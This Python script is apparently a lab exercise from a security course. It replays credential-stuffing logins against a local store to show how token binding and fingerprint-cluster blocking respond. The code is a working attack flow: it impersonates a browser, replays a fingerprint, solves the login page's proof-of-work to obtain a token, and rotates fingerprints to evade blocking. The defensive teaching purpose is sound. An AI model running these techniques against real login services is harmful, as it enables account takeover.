"""
Chapter 9 — Round 4 exercise: why the login needs a bound token (Section 9.7, Part 5)

This is a *defender's* exercise. It replays the credential-stuffing traffic
pattern against your own local store so you can watch L4 (token binding and
the per-cluster failure ratio) decide on it. It is deliberately minimal: it
exists to produce the signal the defense reads, not to be a usable stuffer.
The ethics guardrails are hard rules, not options:

  - target() refuses any host that is not localhost / 127.0.0.1 / ::1
  - every credential is synthetic lab data (tools/seed.py, all @mail.example)
  - "egress" is a claimed X-Lab-Egress header from a documentation range

The point of the round is the economics, so the script measures two numbers:

    takeovers               the store logged the session in as the victim
    credentials confirmed   the reply revealed the password was correct — a
                            takeover, OR a step-up challenge ("we emailed a
                            code"). A step-up still tells the attacker the
                            password works, which is why L4 blocks the whole
                            fingerprint cluster *before* checking the password.

Modes (each shows a different L4 behaviour):
    (default)     plain POST /api/login: no page, no telemetry, no token
    --with-token  the browser-equivalent flow: send a replayed fingerprint,
                  obtain a login token the way the page does, then log in
    --rotate-fp   with --with-token, present a new fingerprint each attempt

Expected results:
    DEFENSE_LEVEL 0–3   ~10 takeovers of 60 (every victim who reused a password)
    DEFENSE_LEVEL 4     default:               0 takeovers, 0 confirmed  [L4] no token
                        --with-token, starter: 0 takeovers, ~10 confirmed (step-up leaks it)
                        --with-token, TODO done: a few confirmed, then the cluster is blocked
                        --with-token --rotate-fp: confirmed again — see the debrief

Run:  python attacks/round4_stuffing.py [--with-token] [--rotate-fp] [--limit 60]
"""

import argparse
import hashlib
import itertools
import json
import os
import sys

from curl_cffi import requests as cffi

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import Cost, combo_list, egress_pool, report, rng_for, summary, target  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))


def _token_proof(nonce, fp_hash, difficulty):
    """The proof-of-work from challenge.js, re-expressed in Python.

    The lesson of W2 Ch2 is that client-side code is never secret: a defender
    should assume the attacker can reproduce it, as this does. The token's
    value is binding (one session, one fingerprint), not secrecy.
    """
    def zero_bits(d):
        n = 0
        for b in d:
            if b:
                return n + 8 - b.bit_length()
            n += 8
        return n
    for counter in itertools.count():
        digest = hashlib.sha256(f"{nonce}:{fp_hash}:{counter}".encode()).digest()
        if zero_bits(digest) >= difficulty:
            return counter


def _replay_fp(rotate, rng):
    fp = json.load(open(os.path.join(HERE, "data", "replay_fp.json")))["fp"]
    if rotate:
        fp = dict(fp, canvas=f"{rng.getrandbits(32):08x}")
    return fp


def _attempt(base, email, password, egress, with_token, fp):
    """One login attempt. Returns an outcome row for the scoreboard."""
    s = cffi.Session(impersonate="chrome150", verify=False)
    s.headers["X-Lab-Egress"] = egress
    headers = {}
    if with_token:
        s.get(f"{base}/login")
        reply = s.post(f"{base}/api/telemetry", json={"page": "/login", "fp": fp, "events": {}}).json()
        chal = s.get(f"{base}/api/challenge").json()
        counter = _token_proof(chal["nonce"], reply.get("fp_hash", ""), chal["difficulty"])
        verify = s.post(f"{base}/api/challenge/verify",
                        json={"nonce": chal["nonce"], "counter": counter}).json()
        headers["X-Lab-Token"] = verify.get("token") or ""
    r = s.post(f"{base}/api/login", json={"email": email, "password": password}, headers=headers)
    body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    outcome = body.get("outcome", "error")
    sid = s.get(f"{base}/whoami").json().get("sid")
    return {"outcome": outcome, "reasons": body.get("reasons", []),
            "takeover": outcome == "allow", "confirmed": outcome in ("allow", "challenge"), "sid": sid}


def run(with_token=False, rotate_fp=False, limit=60, verbose=False):
    base = target()
    rng = rng_for("round4")
    pool = egress_pool()
    combos = combo_list()[:limit]
    results = []
    with Cost() as cost:
        for email, password in combos:
            fp = _replay_fp(rotate_fp, rng) if with_token else None
            results.append(_attempt(base, email, password, rng.choice(pool), with_token, fp))
    s = summary("round4_stuffing", results, cost, success_key="takeover")
    s["confirmed"] = sum(r["confirmed"] for r in results)
    if verbose:
        report(s, success_label="account takeovers")
        print(f"  credentials confirmed (takeover or step-up): {s['confirmed']}/{s['attempts']}")
    return s


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    parser.add_argument("--with-token", action="store_true",
                        help="reproduce the page's token flow in Python")
    parser.add_argument("--rotate-fp", action="store_true", help="a new fingerprint per attempt")
    parser.add_argument("--limit", type=int, default=60)
    args = parser.parse_args()
    run(args.with_token, args.rotate_fp, args.limit, verbose=True)
